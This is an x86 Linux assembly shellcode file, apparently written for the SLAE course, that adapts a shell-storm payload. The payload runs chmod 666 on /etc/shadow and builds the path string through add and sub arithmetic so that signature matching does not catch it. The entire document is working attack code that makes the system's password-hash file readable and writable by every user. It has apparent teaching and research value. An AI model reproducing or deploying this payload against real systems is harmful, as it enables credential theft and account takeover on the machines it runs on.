 ; linux /x86 chmod 666 /etc/shadow 27 bytes
 ; By: root@thegibson
 ; website: shell-storm.org/shellcode/files/shellcode-566.php
 ; Filename: polymorphic-chmod666.nasm
 ; Author: Kunal Pachauri
 ; SLAE-9237

section .text
	global _start

_start:
	; chmod("/etc/shadow",0666);
	
	; mov al, 15
	mov al, 14
	inc al
 	
	push edx
		
	; push dword 0x776f6461
	mov edx, 0x665e5350
	add edx, 0x11111111
	push edx	

	; push dword 0x68732f63
	sub edx, 0xefc34fe
	push edx
	
	; push dword 0x74652f2f
	add edx, 0xbf1ffcc
	push edx
	
	mov ebx, esp
	mov cx, 0666o
	int 0x80 
